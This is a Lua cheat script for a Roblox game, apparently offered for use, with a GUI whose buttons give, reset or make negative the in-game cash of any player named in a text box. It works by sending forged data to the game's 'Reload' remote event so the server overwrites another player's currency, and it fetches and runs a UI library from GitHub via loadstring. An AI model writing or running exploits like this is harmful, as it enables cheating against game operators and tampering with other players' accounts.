local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("xro", "Synapse")
local Tab = Window:NewTab("Cash")
local Section = Tab:NewSection("Cash")




local Workspace = game:GetService("Workspace")
local Players = game.Players.LocalPlayer

local Character = Players.Character

game.ReplicatedStorage:FindFirstChild(".gg/untitledhood"):FireServer(
    "Reload",
    {
        Name = "[Revolver]", --// reminder: [Double-Barrel SG] or [Revolver] works for any gun but i put it here so i can just copy and paste whenever i want to
        Parent = Game.Players.LocalPlayer.Backpack,
        ClassName = "Tool",
        Ammo = {Value = math.huge*9e9},
        MaxAmmo = {Value = 0},
        GunScript = game:GetService("Players").LocalPlayer.Backpack["[Revolver]"].GunScript,
        Handle = game:GetService("Players").LocalPlayer.Backpack["[Revolver]"].Handle
    }
)

_G.Aiden = "OTI0NTUzNDc0Njk4NTE"

_G.Amount = 999999999999999999

_G.Amount2 = 99999999999999999999999
---

_G.Reset = 0 

Section:NewButton("Give 999999999999999999 Cash", "", function()

game.ReplicatedStorage:FindFirstChild(".gg/untitledhood"):FireServer(
    "Reload",
    {
        Name = "[Revolver]",
        Parent = Game.Players.LocalPlayer.Backpack,
        ClassName = "Tool",
        Ammo = game:GetService("Players")[_G.Aiden].DataFolder.Currency,
        MaxAmmo = {Value = _G.Amount},
        GunScript = game:GetService("Players").LocalPlayer.Backpack["[Revolver]"].GunScript,
        Handle = game:GetService("Players").LocalPlayer.Backpack["[Revolver]"].Handle
    }
) 
end)


Section:NewButton("Reset Cash", "", function()

game.ReplicatedStorage:FindFirstChild(".gg/untitledhood"):FireServer(
    "Reload",
    {
        Name = "[Revolver]",
        Parent = Game.Players.LocalPlayer.Backpack,
        ClassName = "Tool",
        Ammo = game:GetService("Players")[_G.Aiden].DataFolder.Currency,
        MaxAmmo = {Value = _G.Reset},
        GunScript = game:GetService("Players").LocalPlayer.Backpack["[Revolver]"].GunScript,
        Handle = game:GetService("Players").LocalPlayer.Backpack["[Revolver]"].Handle
    }
) 
end)


Section:NewButton("Give Negative Cash", "", function()
    
                game.ReplicatedStorage:FindFirstChild(".gg/untitledhood"):FireServer(
    "Reload",
    {
        Name = "[Revolver]",
        Parent = Game.Players.LocalPlayer.Backpack,
        ClassName = "Tool",
        Ammo = game:GetService("Players")[_G.Aiden].DataFolder.Currency,
        MaxAmmo = {Value = _G.Amount2},
        GunScript = game:GetService("Players").LocalPlayer.Backpack["[Revolver]"].GunScript,
        Handle = game:GetService("Players").LocalPlayer.Backpack["[Revolver]"].Handle
    }
) 
end)
    
Section:NewTextBox("Username", "the guy who receive cash", function(value)
    _G.Aiden = value
end)